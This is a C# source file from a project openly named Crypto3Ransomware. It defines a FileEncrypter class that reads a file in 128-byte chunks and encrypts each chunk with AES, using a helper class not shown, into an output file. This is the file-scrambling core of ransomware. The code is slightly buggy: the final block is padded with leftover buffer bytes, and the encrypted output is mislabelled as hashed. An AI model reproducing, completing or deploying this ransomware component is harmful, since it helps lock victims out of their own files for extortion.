using System.Collections.Concurrent;
using System.Security.Cryptography;
using System.Text;

namespace Crypto3Ransomware;

public static class FileEncrypter
{
    private const int Offset = 0;
    private const int BlocSize = 128;
    
    public static void EncryptAndWriteToPath(string fileToEncryptPath, string pathToWriteEncryptedFile)
    {
        using var sourceStream =
            new FileStream(
                fileToEncryptPath,
                FileMode.Open, FileAccess.Read, FileShare.Read,
                bufferSize: BlocSize);

        var bytes = new byte[BlocSize];
        // ConcurrentBag<byte[]> bytesEncrypted = [];
        var aesEncryptor = new MyAes().GetEncryptor();
        
        using var outputStream = new FileStream(pathToWriteEncryptedFile, FileMode.Append, FileAccess.Write,
            FileShare.ReadWrite, bufferSize: BlocSize);

        while (sourceStream.Read(bytes, Offset, BlocSize) > 0)
        {
            var hashedBytes = aesEncryptor.TransformFinalBlock(bytes, 0,BlocSize);
            outputStream.Write(hashedBytes);
        }
        
        outputStream.Close();
        sourceStream.Close();
    }
}